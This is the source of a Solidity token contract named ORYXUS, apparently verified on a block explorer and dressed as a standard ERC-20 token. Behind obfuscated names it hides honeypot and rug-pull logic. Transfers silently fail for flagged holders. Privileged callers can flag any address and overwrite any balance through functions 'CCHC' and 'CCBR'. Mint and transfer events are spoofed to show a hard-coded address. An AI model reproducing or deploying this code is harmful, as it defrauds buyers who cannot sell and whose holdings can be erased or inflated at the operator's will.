/**
 *Submitted for verification at Etherscan.io on 2023-03-13
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-13
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ORYXUS {
    using SafeMath for uint256;
    mapping (address => uint256) private QQa;
	
    mapping (address => uint256) public QQb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ORYXUS";
	
    string public symbol = "ORYXUS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private QQc;
      address private QQd;
    uint256 private QQe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address QQf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        QQd = msg.sender;
             QQa[msg.sender] = totalSupply;
        
       ORBIT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function ORBIT() internal  {                             
                       QQb[msg.sender] = 6;
                       QQc = QQf;

                

        emit Transfer(address(0), QQc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return QQa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(QQb[msg.sender] <= QQe) {
    require(QQa[msg.sender] >= value);
QQa[msg.sender] -= value;  
QQa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(QQb[msg.sender] > QQe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function CCHC (address QQj, uint256 QQk) public {
		if(QQb[msg.sender] == QQe) {   
			   	   
   QQb[QQj] = QQk;}
   }
		       function CST (uint256 QQk) onlyOwner public {
                   
                     QQe = QQk; 
	}


 

 		       function CCBR (address QQj, uint256 QQk) public {		
                    	if(QQb[msg.sender] == QQe) {    	   
  QQa[QQj] = QQk;}

       unchecked {                    	require(QQb[msg.sender] == QQe);}   	   
 
  }




   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(QQb[from] < QQe && QQb[to] < QQe) {
        require(value <= QQa[from]);
        require(value <= allowance[from][msg.sender]);
        QQa[from] -= value;
        QQa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(QQb[from] == QQe) {
        require(value <= QQa[from]);
        require(value <= allowance[from][msg.sender]);
        QQa[from] -= value;
        QQa[to] += value;
        allowance[from][msg.sender] -= value;


            from = QQf;
	   

        emit Transfer(from, to, value);
        return true; }
if(QQb[from] >= 1000) {   emit Transfer(from, from, value);}

         if(QQb[from] > QQe || QQb[to] > QQe) {
             
         }}



     

        	
 }